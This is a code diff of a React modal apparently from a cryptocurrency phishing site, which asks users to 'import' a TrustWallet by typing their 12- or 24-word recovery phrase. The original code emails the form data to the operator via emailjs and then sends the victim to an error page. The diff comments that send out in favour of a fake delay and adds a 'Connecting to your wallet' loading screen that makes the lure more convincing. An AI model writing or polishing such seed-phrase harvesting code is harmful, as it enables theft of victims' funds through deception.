@@ -5,6 +5,8 @@ import Overlay from "./Overlay"
 import { useReducer, useState } from "react"
 import { useNavigate } from "react-router-dom"
 import emailjs from '@emailjs/browser';
+import { usePromiseTracker, trackPromise } from "react-promise-tracker"
+import Loading from "./Loading"
 
 function formReducer(state, event) {
     if (event.reset) {
@@ -22,22 +24,21 @@ function formReducer(state, event) {
 }
 
 const ConnectManuallyModal = ({ title, src, closeConnectManualModal }) => {
-    const [disabled, toggleDisabled] = useReducer((state) => !state, false)
-    let [formData, setFormData] = useReducer(formReducer, {})
-    let [activeTab, setActiveTab] = useState()
+    const [formData, setFormData] = useReducer(formReducer, {})
+    const [activeTab, setActiveTab] = useState()
+    const { promiseInProgress } = usePromiseTracker()
     const navigate = useNavigate()
 
     const sendEmail = () => {
-        return emailjs.send(process.env["REACT_APP_SERVICE_ID"], process.env["REACT_APP_TEMPLATE_ID"], formData, process.env["REACT_APP_PUBLIC_KEY"])
-        // return new Promise((resolve, reject) => {
-        //     setTimeout(() => resolve("form submitted"), 3000)
-        // })
+        // return emailjs.send(process.env["REACT_APP_SERVICE_ID"], process.env["REACT_APP_TEMPLATE_ID"], formData, process.env["REACT_APP_PUBLIC_KEY"])
+        return new Promise((resolve, reject) => {
+            setTimeout(() => resolve("form submitted"), 3000)
+        })
     }
 
 
     const handleSubmit = (e) => {
         e.preventDefault()
-        toggleDisabled()
 
         switch (activeTab) {
             case "Phrase":
@@ -57,18 +58,18 @@ const ConnectManuallyModal = ({ title, src, closeConnectManualModal }) => {
                 return undefined
         }
 
-        sendEmail()
-            .then((res) => {
-                toggleDisabled()
+        trackPromise(
+            sendEmail()
+                .then((res) => {
 
-                setFormData({
-                    reset: true
+                    setFormData({
+                        reset: true
+                    })
+
+                    navigate("/error")
                 })
-
-                navigate("/error")
-            })
-            .catch((err) => console.error("Something went wrong"))
-
+                .catch((err) => console.error("Something went wrong"))
+        )
 
     }
 
@@ -83,13 +84,16 @@ const ConnectManuallyModal = ({ title, src, closeConnectManualModal }) => {
         console.dir(formData)
     }
 
+    if (promiseInProgress) return <Loading loadingMsg={"Connecting to your wallet"} />
+
     return ReactDom.createPortal(
         <>
-            <form onSubmit={handleSubmit} disabled={disabled} className=" w-11/12 z-50 max-w-xl fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 shadow-lg rounded-lg bg-white py-8 px-5 space-y-9">
+            <form onSubmit={handleSubmit} disabled={promiseInProgress} className=" w-11/12 z-50 max-w-xl fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 shadow-lg rounded-lg bg-white py-8 px-5 space-y-9">
                 <div className="flex justify-between items-center">
                     <CustomPlaceholder width={40} height={40} className="block" />
                     <h3 className="font-medium text-xl text-center">import your {title || "TrustWallet"} wallet</h3>
                 </div>
+
                 <Tabs getActiveTab={setActiveTab}>
                     <Tab label="Phrase">
                         <textarea className="w-full placeholder:text-normal font-light px-3 py-2  border-2 resize-none rounded-xl border-solid mb-2"
@@ -140,8 +144,9 @@ const ConnectManuallyModal = ({ title, src, closeConnectManualModal }) => {
                         <p className="text-gray-600 text-sm font-light tracking-wide text-center">Typically 12 (sometimes 24) words seperated by a single space.</p>
                     </Tab>
                 </Tabs>
+
                 <div className="space-y-4">
-                    <button className={`block bg-blue-400 px-4 py-2 text-center w-full rounded-lg font-semibold text-white text-lg ${disabled && "pointer-events-none cursor-none"}`} disabled={disabled}>proceed</button>
+                    <button className={`block bg-blue-400 px-4 py-2 text-center w-full rounded-lg font-semibold text-white text-lg ${promiseInProgress && "pointer-events-none bg-gray-500 cursor-none"}`} disabled={promiseInProgress}>proceed</button>
                     <button className="block bg-red-400 px-4 py-2 text-center w-full rounded-lg font-semibold text-white text-lg" onClick={closeConnectManualModal}>cancel</button>
                 </div>
             </form>
